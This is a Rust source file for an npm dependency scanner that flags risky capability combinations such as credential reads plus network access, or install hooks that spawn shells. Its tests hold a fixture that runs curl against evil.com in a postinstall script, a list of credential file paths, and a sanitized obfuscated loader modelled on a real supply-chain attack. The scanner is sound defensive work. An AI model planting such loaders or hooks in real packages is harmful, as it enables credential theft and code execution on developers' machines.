use std::collections::{HashMap, HashSet};
use std::path::Path;

use walkdir::WalkDir;

use crate::checks::{Check, CheckResult, Confidence, Finding, ScanContext, Severity};

/// Capability flags detected per package
#[derive(Debug, Default, Clone)]
struct PackageCapabilities {
    network: bool,         // C1: imports http/https/net/dgram/dns/fetch/axios etc.
    fs_read: bool,         // C2: imports fs + read operations
    fs_write: bool,        // C3: imports fs + write operations
    shell_exec: bool,      // C4: imports child_process
    env_access: bool,      // C5: process.env access
    credential_read: bool, // C6: fs read targeting sensitive paths
    install_hook: bool,    // C7: postinstall/preinstall in package.json
    dynamic_load: bool,    // C8: require(variable) or import(variable)
    obfuscated: bool,      // C9: obfuscation detected
}

impl PackageCapabilities {
    fn capabilities_list(&self) -> Vec<&'static str> {
        let mut caps = Vec::new();
        if self.network {
            caps.push("network");
        }
        if self.fs_read {
            caps.push("fs_read");
        }
        if self.fs_write {
            caps.push("fs_write");
        }
        if self.shell_exec {
            caps.push("shell_exec");
        }
        if self.env_access {
            caps.push("env_access");
        }
        if self.credential_read {
            caps.push("credential_read");
        }
        if self.install_hook {
            caps.push("install_hook");
        }
        if self.dynamic_load {
            caps.push("dynamic_load");
        }
        if self.obfuscated {
            caps.push("obfuscated");
        }
        caps
    }

    fn has_any(&self) -> bool {
        self.network
            || self.fs_read
            || self.fs_write
            || self.shell_exec
            || self.env_access
            || self.credential_read
            || self.install_hook
            || self.dynamic_load
            || self.obfuscated
    }
}

// --- Module lists for capability detection ---

const NETWORK_MODULES: &[&str] = &[
    "http",
    "https",
    "net",
    "dgram",
    "dns",
    "http2",
    "node:http",
    "node:https",
    "node:net",
    "node:dgram",
    "node:dns",
    "node:http2",
    "axios",
    "node-fetch",
    "request",
    "got",
    "superagent",
    "undici",
    "cross-fetch",
    "isomorphic-fetch",
];

const EXEC_MODULES: &[&str] = &["child_process", "node:child_process"];

const FS_MODULES: &[&str] = &["fs", "fs/promises", "node:fs", "node:fs/promises"];

const FS_READ_METHODS: &[&str] = &[
    "readFile",
    "readFileSync",
    "createReadStream",
    "readdir",
    "readdirSync",
    "access",
    "accessSync",
];

const FS_WRITE_METHODS: &[&str] = &[
    "writeFile",
    "writeFileSync",
    "createWriteStream",
    "copyFile",
    "copyFileSync",
    "rename",
    "renameSync",
    "appendFile",
    "appendFileSync",
    "mkdir",
    "mkdirSync",
    "unlink",
    "unlinkSync",
];

const CREDENTIAL_PATHS: &[&str] = &[
    ".ssh",
    ".aws",
    ".gnupg",
    ".npmrc",
    ".env",
    ".docker/config",
    ".kube/config",
    "id_rsa",
    "credentials",
    "/etc/passwd",
    "/etc/shadow",
];

// No built-in allowlist — any package can be compromised (event-stream, ua-parser-js, colors.js).
// Trust is earned by behavior analysis, not package identity. Users can add their own
// allowlist via config if they explicitly choose to trust specific packages.

// --- Combination rules ---

struct CombinationRule {
    name: &'static str,
    /// Capability check function — returns true if this combination is present
    check: fn(&PackageCapabilities) -> bool,
    severity: Severity,
    message: &'static str,
    suggestion: &'static str,
}

const COMBINATION_RULES: &[CombinationRule] = &[
    CombinationRule {
        name: "credential-exfiltration",
        check: |c| c.credential_read && c.network,
        severity: Severity::Critical,
        message: "reads credential files AND makes network requests — potential exfiltration",
        suggestion: "Remove immediately — no legitimate package reads your credentials and sends them over the network",
    },
    CombinationRule {
        name: "dropper",
        check: |c| c.shell_exec && c.network,
        severity: Severity::Critical,
        message: "executes shell commands AND makes network requests — potential dropper/C2",
        suggestion: "Review carefully — this combination can download and execute arbitrary code",
    },
    CombinationRule {
        name: "install-exec",
        check: |c| c.install_hook && c.shell_exec,
        severity: Severity::Critical,
        message: "install script with shell execution — common malware entry vector",
        suggestion: "Install hooks that spawn shells are the #1 supply chain attack pattern",
    },
    CombinationRule {
        name: "install-network",
        check: |c| c.install_hook && c.network,
        severity: Severity::High,
        message: "install script with network access — review for second-stage downloads",
        suggestion: "Legitimate install scripts rarely need network access — investigate what it downloads",
    },
    CombinationRule {
        name: "obfuscated-dynamic",
        check: |c| c.dynamic_load && c.obfuscated,
        severity: Severity::Critical,
        message: "dynamic loading with obfuscation — capabilities hidden, likely malicious",
        suggestion: "This package hides what modules it loads AND uses obfuscation — strong malware indicator",
    },
    CombinationRule {
        name: "env-exfiltration",
        check: |c| c.env_access && c.network,
        severity: Severity::High,
        message: "accesses environment variables AND makes network requests — potential secret exfiltration",
        suggestion: "Check if env vars are sent over the network — legitimate logging should filter secrets",
    },
    CombinationRule {
        name: "payload-staging",
        check: |c| c.fs_write && c.shell_exec,
        severity: Severity::High,
        message: "writes files AND executes commands — potential payload staging",
        suggestion: "This combination can write a payload to disk and execute it",
    },
    CombinationRule {
        name: "dynamic-install",
        check: |c| c.dynamic_load && c.install_hook,
        severity: Severity::High,
        message: "dynamic loading in package with install hook — hidden capabilities during install",
        suggestion: "Install hooks should use static imports — dynamic loading hides intent",
    },
];

// --- Check implementation ---

pub struct CapabilitiesCheck;

impl Check for CapabilitiesCheck {
    fn name(&self) -> &str {
        "capabilities"
    }

    fn run(&self, ctx: &ScanContext) -> anyhow::Result<CheckResult> {
        let max_score = ctx.config.scoring.weight_for("capabilities") as f64;

        let nm_dir = ctx.root.join("node_modules");
        if !nm_dir.exists() {
            return Ok(CheckResult::new(
                "capabilities",
                vec![],
                max_score,
                vec!["No node_modules found — skipping capability analysis".into()],
            ));
        }

        let user_allow = &ctx.config.capabilities.allow;
        let mut findings = Vec::new();
        let mut packages_scanned = 0;
        let mut packages_with_caps = 0;

        // Scan each package
        let entries = match std::fs::read_dir(&nm_dir) {
            Ok(e) => e,
            Err(_) => {
                return Ok(CheckResult::new(
                    "capabilities",
                    vec![],
                    max_score,
                    vec!["Could not read node_modules".into()],
                ))
            }
        };

        for entry in entries.flatten() {
            let path = entry.path();
            if !path.is_dir() {
                continue;
            }

            let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");

            if dir_name.starts_with('.') {
                continue;
            }

            if dir_name.starts_with('@') {
                // Scoped packages
                if let Ok(scoped) = std::fs::read_dir(&path) {
                    for sub in scoped.flatten() {
                        let sub_path = sub.path();
                        if sub_path.is_dir() {
                            let pkg_name = format!(
                                "{}/{}",
                                dir_name,
                                sub_path.file_name().and_then(|n| n.to_str()).unwrap_or("")
                            );
                            if let Some(caps) = scan_package(&sub_path) {
                                packages_scanned += 1;
                                if caps.has_any() {
                                    packages_with_caps += 1;
                                    evaluate_package(&pkg_name, &caps, user_allow, &mut findings);
                                }
                            }
                        }
                    }
                }
            } else if let Some(caps) = scan_package(&path) {
                packages_scanned += 1;
                if caps.has_any() {
                    packages_with_caps += 1;
                    evaluate_package(dir_name, &caps, user_allow, &mut findings);
                }
            }
        }

        let pass_messages = vec![format!(
            "{packages_scanned} packages scanned, {packages_with_caps} with capabilities, {} dangerous combinations found",
            findings.len()
        )];

        Ok(CheckResult::new(
            "capabilities",
            findings,
            max_score,
            pass_messages,
        ))
    }
}

/// Scan all JS files in a package directory to build capability profile.
/// Uses a two-pass approach to correctly detect cross-file capability combinations:
/// Pass 1: detect base capabilities (network, fs_read, shell_exec, etc.)
/// Pass 2: check credential paths across ALL files using aggregated fs_read state
fn scan_package(pkg_dir: &Path) -> Option<PackageCapabilities> {
    let mut caps = PackageCapabilities::default();

    // Check package.json for install hooks
    let pkg_json = pkg_dir.join("package.json");
    if pkg_json.exists() {
        if let Ok(content) = std::fs::read_to_string(&pkg_json) {
            if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&content) {
                if let Some(scripts) = parsed.get("scripts").and_then(|s| s.as_object()) {
                    if scripts.contains_key("preinstall")
                        || scripts.contains_key("postinstall")
                        || scripts.contains_key("install")
                    {
                        caps.install_hook = true;
                    }
                }
            }
        }
    }

    // Pass 1: Scan JS/TS source files and buffer contents for cross-file analysis
    let mut file_contents: Vec<String> = Vec::new();

    for entry in WalkDir::new(pkg_dir)
        .max_depth(5)
        .follow_links(false)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
    {
        let path = entry.path();
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");

        if !matches!(ext, "js" | "mjs" | "cjs" | "ts" | "mts" | "cts") {
            continue;
        }

        // Skip large files, test files, declaration files
        if let Ok(meta) = path.metadata() {
            if meta.len() > 500_000 {
                continue;
            }
        }
        let filename = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if filename.ends_with(".d.ts")
            || filename.ends_with(".d.mts")
            || filename.ends_with(".test.js")
            || filename.ends_with(".spec.js")
            || filename.ends_with(".min.js")
        {
            continue;
        }

        let content = match std::fs::read_to_string(path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        detect_capabilities(&content, &mut caps);
        file_contents.push(content);
    }

    // Pass 2: Cross-file credential path check.
    // credential_read requires fs_read (from any file) + credential path (in any file).
    // The per-file detect_capabilities may miss this if files are processed in wrong order.
    if caps.fs_read && !caps.credential_read {
        for content in &file_contents {
            if CREDENTIAL_PATHS.iter().any(|p| content.contains(p)) {
                caps.credential_read = true;
                break;
            }
        }
    }

    Some(caps)
}

/// Detect capabilities from file content
fn detect_capabilities(content: &str, caps: &mut PackageCapabilities) {
    // C1: Network capability
    if !caps.network {
        for module in NETWORK_MODULES {
            if content.contains(module) {
                // Verify it's an actual import, not just a string mention
                let pattern = format!("require('{module}')");
                let pattern2 = format!("require(\"{module}\")");
                let pattern3 = format!("from '{module}'");
                let pattern4 = format!("from \"{module}\"");
                if content.contains(&pattern)
                    || content.contains(&pattern2)
                    || content.contains(&pattern3)
                    || content.contains(&pattern4)
                {
                    caps.network = true;
                    break;
                }
            }
        }
    }

    // C4: Shell execution
    if !caps.shell_exec {
        for module in EXEC_MODULES {
            let pattern = format!("require('{module}')");
            let pattern2 = format!("require(\"{module}\")");
            let pattern3 = format!("from '{module}'");
            let pattern4 = format!("from \"{module}\"");
            if content.contains(&pattern)
                || content.contains(&pattern2)
                || content.contains(&pattern3)
                || content.contains(&pattern4)
            {
                caps.shell_exec = true;
                break;
            }
        }
    }

    // C2/C3: Filesystem access
    if !caps.fs_read || !caps.fs_write {
        let has_fs_import = FS_MODULES.iter().any(|m| {
            let p1 = format!("require('{m}')");
            let p2 = format!("require(\"{m}\")");
            let p3 = format!("from '{m}'");
            let p4 = format!("from \"{m}\"");
            content.contains(&p1)
                || content.contains(&p2)
                || content.contains(&p3)
                || content.contains(&p4)
        });

        if has_fs_import {
            if !caps.fs_read {
                caps.fs_read = FS_READ_METHODS.iter().any(|m| content.contains(m));
            }
            if !caps.fs_write {
                caps.fs_write = FS_WRITE_METHODS.iter().any(|m| content.contains(m));
            }
        }
    }

    // C5: Environment access
    if !caps.env_access && content.contains("process.env") {
        caps.env_access = true;
    }

    // C6: Credential file read
    if !caps.credential_read && caps.fs_read {
        for cred_path in CREDENTIAL_PATHS {
            if content.contains(cred_path) {
                caps.credential_read = true;
                break;
            }
        }
    }

    // C8: Dynamic loading (look for P013-style patterns)
    if !caps.dynamic_load {
        // Regex-level check: require followed by non-string arg
        let has_dynamic = content.contains("require(")
            && content.lines().any(|line| {
                if let Some(pos) = line.find("require(") {
                    let after = &line[pos + 8..];
                    // Check if the next non-whitespace char is NOT a quote
                    let trimmed = after.trim_start();
                    !trimmed.is_empty()
                        && !trimmed.starts_with('\'')
                        && !trimmed.starts_with('"')
                        && !trimmed.starts_with('`')
                        && !trimmed.starts_with(')')
                } else {
                    false
                }
            });
        if has_dynamic {
            caps.dynamic_load = true;
        }
    }

    // C9: Obfuscation indicators
    if !caps.obfuscated
        && (content.contains("_0x")
            || content.contains("while(!![])")
            || content.contains("while (!![]) ")
            || (content.contains("String.fromCharCode")
                && content.contains("charCodeAt")
                && content.contains("^")))
    {
        caps.obfuscated = true;
    }
}

/// Evaluate a package's capabilities against combination rules.
/// Only user-configured allowlists suppress findings — no built-in allowlist.
fn evaluate_package(
    pkg_name: &str,
    caps: &PackageCapabilities,
    user_allow: &HashMap<String, Vec<String>>,
    findings: &mut Vec<Finding>,
) {
    // User allowlist only — user explicitly chooses to trust specific packages
    let mut allowed: HashSet<&str> = HashSet::new();
    if let Some(user_caps) = user_allow.get(pkg_name) {
        for cap in user_caps {
            allowed.insert(cap.as_str());
        }
    }

    for rule in COMBINATION_RULES {
        if (rule.check)(caps) {
            // If user explicitly allowed all involved capabilities, suppress
            if !allowed.is_empty() {
                let detected = caps.capabilities_list();
                if detected.iter().all(|cap| allowed.contains(cap)) {
                    continue;
                }
            }

            let cap_list = caps.capabilities_list().join(", ");
            findings.push(
                Finding::new(
                    format!("DEPSEC-CAP:{}", rule.name),
                    rule.severity,
                    format!(
                        "Package '{}' {}\n  Capabilities: [{}]",
                        pkg_name, rule.message, cap_list
                    ),
                )
                .with_confidence(Confidence::High)
                .with_suggestion(rule.suggestion)
                .with_package(Some(pkg_name.to_string())),
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_network_require() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities("const http = require('http');\nhttp.get('url');", &mut caps);
        assert!(
            caps.network,
            "Should detect network capability from require('http')"
        );
    }

    #[test]
    fn test_detect_network_import() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities("import fetch from 'node-fetch';", &mut caps);
        assert!(
            caps.network,
            "Should detect network capability from import node-fetch"
        );
    }

    #[test]
    fn test_detect_shell_exec() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities(
            "const cp = require('child_process');\ncp.exec('ls');",
            &mut caps,
        );
        assert!(caps.shell_exec, "Should detect shell exec capability");
    }

    #[test]
    fn test_detect_fs_read() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities(
            "const fs = require('fs');\nfs.readFileSync('file.txt');",
            &mut caps,
        );
        assert!(caps.fs_read, "Should detect fs read capability");
        assert!(!caps.fs_write, "Should NOT detect fs write");
    }

    #[test]
    fn test_detect_fs_write() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities(
            "const fs = require('fs');\nfs.writeFileSync('out.txt', data);",
            &mut caps,
        );
        assert!(caps.fs_write, "Should detect fs write capability");
    }

    #[test]
    fn test_detect_env_access() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities("const key = process.env.API_KEY;", &mut caps);
        assert!(caps.env_access, "Should detect env access");
    }

    #[test]
    fn test_detect_credential_read() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities(
            "const fs = require('fs');\nconst key = fs.readFileSync('~/.ssh/id_rsa');",
            &mut caps,
        );
        assert!(caps.fs_read);
        assert!(caps.credential_read, "Should detect credential file read");
    }

    #[test]
    fn test_detect_dynamic_load() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities("const m = require(decoded);", &mut caps);
        assert!(caps.dynamic_load, "Should detect dynamic require");
    }

    #[test]
    fn test_static_require_not_dynamic() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities("const fs = require('fs');", &mut caps);
        assert!(
            !caps.dynamic_load,
            "Static require should NOT be flagged as dynamic"
        );
    }

    #[test]
    fn test_detect_obfuscation() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities("function _0x3a2f() { while (!![]) { break; } }", &mut caps);
        assert!(caps.obfuscated, "Should detect obfuscation");
    }

    #[test]
    fn test_clean_package_no_capabilities() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities(
            "module.exports = function add(a, b) { return a + b; };",
            &mut caps,
        );
        assert!(!caps.has_any(), "Clean code should have no capabilities");
    }

    #[test]
    fn test_combination_credential_exfiltration() {
        let caps = PackageCapabilities {
            credential_read: true,
            network: true,
            fs_read: true,
            ..Default::default()
        };
        let mut findings = Vec::new();
        evaluate_package("evil-pkg", &caps, &HashMap::new(), &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "DEPSEC-CAP:credential-exfiltration"),
            "Should flag credential exfiltration combo"
        );
    }

    #[test]
    fn test_combination_dropper() {
        let caps = PackageCapabilities {
            shell_exec: true,
            network: true,
            ..Default::default()
        };
        let mut findings = Vec::new();
        evaluate_package("evil-pkg", &caps, &HashMap::new(), &mut findings);
        assert!(
            findings.iter().any(|f| f.rule_id == "DEPSEC-CAP:dropper"),
            "Should flag dropper combo"
        );
    }

    #[test]
    fn test_no_builtin_allowlist() {
        // No built-in allowlist — even well-known packages trigger findings on suspicious combos
        // Any package can be compromised (event-stream, ua-parser-js, colors.js)
        let caps = PackageCapabilities {
            network: true,
            shell_exec: true,
            ..Default::default()
        };
        let mut findings = Vec::new();
        evaluate_package("express", &caps, &HashMap::new(), &mut findings);
        assert!(
            !findings.is_empty(),
            "No built-in allowlist — express with network+shell_exec should produce findings"
        );
    }

    #[test]
    fn test_user_allowlist() {
        let caps = PackageCapabilities {
            network: true,
            shell_exec: true,
            ..Default::default()
        };
        let mut user_allow = HashMap::new();
        user_allow.insert(
            "my-build-tool".to_string(),
            vec!["network".to_string(), "shell_exec".to_string()],
        );
        let mut findings = Vec::new();
        evaluate_package("my-build-tool", &caps, &user_allow, &mut findings);
        assert!(
            findings.is_empty(),
            "User-allowed capabilities should not produce findings"
        );
    }

    #[test]
    fn test_user_allowlist_partial_does_not_suppress() {
        let caps = PackageCapabilities {
            network: true,
            shell_exec: true,
            credential_read: true, // NOT in user allowlist
            fs_read: true,
            ..Default::default()
        };
        let mut user_allow = HashMap::new();
        user_allow.insert(
            "my-tool".to_string(),
            vec!["network".to_string(), "shell_exec".to_string()],
        );
        let mut findings = Vec::new();
        evaluate_package("my-tool", &caps, &user_allow, &mut findings);
        assert!(
            !findings.is_empty(),
            "Partially allowed capabilities should still produce findings"
        );
    }

    #[test]
    fn test_obfuscated_dynamic_critical() {
        let caps = PackageCapabilities {
            dynamic_load: true,
            obfuscated: true,
            ..Default::default()
        };
        let mut findings = Vec::new();
        evaluate_package("evil-pkg", &caps, &HashMap::new(), &mut findings);
        let critical: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id == "DEPSEC-CAP:obfuscated-dynamic")
            .collect();
        assert_eq!(critical.len(), 1);
        assert_eq!(critical[0].severity, Severity::Critical);
    }

    // Integration test with real package scanning
    #[test]
    fn test_scan_package_clean() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("clean-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"clean-pkg","version":"1.0.0"}"#,
        )
        .unwrap();
        std::fs::write(
            pkg_dir.join("index.js"),
            "module.exports = function() { return 42; };",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(!caps.has_any(), "Clean package should have no capabilities");
    }

    #[test]
    fn test_scan_package_with_network() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("net-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"net-pkg","version":"1.0.0"}"#,
        )
        .unwrap();
        std::fs::write(
            pkg_dir.join("index.js"),
            "const http = require('http');\nhttp.get('http://example.com');",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(caps.network);
        assert!(!caps.shell_exec);
    }

    #[test]
    fn test_scan_package_with_install_hook() {
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("hook-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"hook-pkg","scripts":{"postinstall":"node setup.js"}}"#,
        )
        .unwrap();
        std::fs::write(
            pkg_dir.join("setup.js"),
            "const cp = require('child_process');\ncp.execSync('curl http://evil.com');",
        )
        .unwrap();

        let caps = scan_package(&pkg_dir).unwrap();
        assert!(caps.install_hook);
        assert!(caps.shell_exec);
    }

    #[test]
    fn test_full_check_run() {
        let dir = tempfile::TempDir::new().unwrap();
        let nm = dir.path().join("node_modules/evil-pkg");
        std::fs::create_dir_all(&nm).unwrap();
        std::fs::write(
            nm.join("package.json"),
            r#"{"name":"evil-pkg","scripts":{"postinstall":"node setup.js"}}"#,
        )
        .unwrap();
        std::fs::write(
            nm.join("index.js"),
            "const http = require('http');\nconst cp = require('child_process');\ncp.exec(cmd);",
        )
        .unwrap();

        let config = crate::config::Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = CapabilitiesCheck.run(&ctx).unwrap();
        assert!(
            !result.findings.is_empty(),
            "Should find dangerous capability combinations"
        );
        // Should detect dropper (network + exec) and install-exec (hook + exec) and install-network (hook + network)
        assert!(result
            .findings
            .iter()
            .any(|f| f.rule_id.contains("dropper") || f.rule_id.contains("install")));
    }

    // =========================================================================
    // GOLDEN TEST: axios/plain-crypto-js supply chain attack (sanitized)
    //
    // This test recreates the ACTUAL structure of the 2026-03-31 axios attack
    // where plain-crypto-js@4.2.1 was injected as a dependency. The payload:
    // - Uses 2-layer obfuscation (XOR + reversed base64)
    // - Dynamically loads fs, os, child_process via require(decode(...))
    // - Destructures execSync as F, calls F(s)
    // - Self-deletes setup.js and replaces package.json
    // - Has a postinstall hook
    //
    // All network calls, file writes, and exec calls are INERT in this test.
    // The test verifies that depsec's detection pipeline catches the attack.
    // =========================================================================

    /// The sanitized payload mimicking plain-crypto-js setup.js
    const AXIOS_PAYLOAD: &str = r#"
// Sanitized version of plain-crypto-js@4.2.1 setup.js
// Original: https://socket.dev/blog/axios-npm-package-compromised
// All dangerous calls replaced with inert equivalents for testing.

const stq = [
    "_kLx+SMgE7Kx1S8vE3LxSSCqEHKxjScp7Kx_gvELKx_gvEvKx",
    "_oaxtWcrF3axHMqEnLxhSMrEvIxqWcoF3bxtWcoF_axsSof3axvMqFxIlxZSMjEJ3xsSCm",
    "_iWSuF3bx9WctFDbxgSsoE7KxjWspEvKchSsrE_LxsSsvELaxiW8tF3Lx+ScuEXKx",
    "_wVF7bxkSMpErLx_jSMpErLx4SMrEnKx"
];

const_trans_1 = function(x, r) {
    try {
        const E = r.split("").map(Number);
        return x.split("").map((k, r) => {
            const S = x.charCodeAt(r);
            a = E[7 * r * r % 10];
            return String.fromCharCode(S ^ a ^ 333);
        }).join("");
    } catch {}
};

_trans_2 = function(x, r) {
    try {
        let E = x.split("").reverse().join("").replaceAll("_", "=");
        S = Buffer.from(E, "base64").toString("utf8");
        return _trans_1(S, r);
    } catch {}
};

ord = "OrDeR_7077";

_entry = function(x) {
    try {
        let r = 4027,
            E = (r.toString().charCodeAt(2), String.fromCharCode(S ^ a ^ 333)),
            t = require(_trans_2(stq[2], ord)),
            W = require(_trans_2(stq[1], ord)),
            {
                execSync: F
            } = require(_trans_2(stq[0], ord));

        // SANITIZED: Original code stages payloads and executes them.
        // Replaced with inert variable assignments for testing.
        var o = W.platform(),
            e = W.tmpdir(),
            q = "test_payload",
            n = "test_artifact";

        // SANITIZED: Original deletes setup.js and renames package.md
        t.unlinkSync(__filename);
        // t.renameSync('package.md', 'package.json');
    } catch {}
};
"#;

    #[test]
    fn test_axios_attack_full_pipeline_patterns() {
        // Test the patterns check catches the axios payload
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/plain-crypto-js");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(pkg_dir.join("setup.js"), AXIOS_PAYLOAD).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"plain-crypto-js","version":"4.2.1","scripts":{"postinstall":"node setup.js"}}"#,
        )
        .unwrap();

        let config = crate::config::Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = crate::checks::patterns::PatternsCheck.run(&ctx).unwrap();

        // Collect all rule IDs that fired
        let rule_ids: Vec<&str> = result.findings.iter().map(|f| f.rule_id.as_str()).collect();

        // P013: Dynamic require() — the killer signal
        assert!(
            rule_ids.iter().any(|r| *r == "DEPSEC-P013"),
            "P013 (dynamic require) should fire on require(_trans_2(...)). Got: {:?}",
            rule_ids
        );

        // P014: String deobfuscation (fromCharCode + XOR)
        assert!(
            rule_ids.iter().any(|r| *r == "DEPSEC-P014"),
            "P014 (deobfuscation) should fire on String.fromCharCode(S ^ a ^ 333). Got: {:?}",
            rule_ids
        );

        // P015: Anti-forensic self-deletion
        assert!(
            rule_ids.iter().any(|r| *r == "DEPSEC-P015"),
            "P015 (anti-forensic) should fire on unlinkSync(__filename). Got: {:?}",
            rule_ids
        );

        // P016: Dependency install script
        assert!(
            rule_ids.iter().any(|r| *r == "DEPSEC-P016"),
            "P016 (dep install script) should fire on postinstall hook. Got: {:?}",
            rule_ids
        );

        // P013 should be ESCALATED due to signal combination with P014
        let escalated = result
            .findings
            .iter()
            .any(|f| f.rule_id == "DEPSEC-P013" && f.message.contains("ESCALATED"));
        assert!(
            escalated,
            "P013 should be ESCALATED when combined with obfuscation signals. Got: {:?}",
            result
                .findings
                .iter()
                .filter(|f| f.rule_id == "DEPSEC-P013")
                .map(|f| &f.message)
                .collect::<Vec<_>>()
        );

        // Verify severity — P013 escalated should be Critical
        let critical_p013 = result
            .findings
            .iter()
            .filter(|f| f.rule_id == "DEPSEC-P013" && f.severity == Severity::Critical)
            .count();
        assert!(
            critical_p013 >= 1,
            "At least one P013 should be Critical severity"
        );

        println!(
            "\n=== AXIOS GOLDEN TEST (patterns) ===\nFindings: {} total",
            result.findings.len()
        );
        for f in &result.findings {
            println!(
                "  [{}] {} — {}",
                f.severity,
                f.rule_id,
                f.message.lines().next().unwrap_or("")
            );
        }
    }

    #[test]
    fn test_axios_attack_full_pipeline_capabilities() {
        // Test the capabilities check catches the axios payload
        let dir = tempfile::TempDir::new().unwrap();
        let pkg_dir = dir.path().join("node_modules/plain-crypto-js");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(pkg_dir.join("setup.js"), AXIOS_PAYLOAD).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"plain-crypto-js","version":"4.2.1","scripts":{"postinstall":"node setup.js"}}"#,
        )
        .unwrap();

        let config = crate::config::Config::default();
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = CapabilitiesCheck.run(&ctx).unwrap();

        // Should detect capabilities
        assert!(
            !result.findings.is_empty(),
            "Capabilities check should flag the axios payload. Got 0 findings."
        );

        let rule_ids: Vec<&str> = result.findings.iter().map(|f| f.rule_id.as_str()).collect();

        // Should detect obfuscated-dynamic combo (C8 + C9)
        assert!(
            rule_ids.iter().any(|r| r.contains("obfuscated")
                || r.contains("dynamic")
                || r.contains("install")),
            "Should detect dangerous capability combination. Got: {:?}",
            rule_ids
        );

        println!(
            "\n=== AXIOS GOLDEN TEST (capabilities) ===\nFindings: {} total",
            result.findings.len()
        );
        for f in &result.findings {
            println!(
                "  [{}] {} — {}",
                f.severity,
                f.rule_id,
                f.message.lines().next().unwrap_or("")
            );
        }
    }
}
